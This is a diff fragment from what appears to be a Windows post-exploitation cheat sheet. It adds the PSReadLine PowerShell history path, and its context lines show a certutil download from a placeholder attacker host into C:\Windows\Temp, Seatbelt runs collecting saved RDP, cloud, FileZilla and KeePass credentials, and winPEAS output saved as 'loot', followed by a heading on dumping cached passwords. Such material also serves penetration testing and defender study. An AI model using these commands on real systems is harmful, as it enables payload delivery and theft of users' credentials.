@@ -14,6 +14,8 @@ certutil.exe -urlcache -split -f "http://<YOUR_IP>/filename.ext" "C:\Windows\Tem
 
 Seatbelt.exe PowerShellHistory SavedRdpConnections CloudCredentials FileZilla KeePass
 winPEASany.exe filesinfo > C:\Windows\Temp\files_loot.txt
+
+%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\
 ```
 
 ### Dump cached pwds and logonpwds
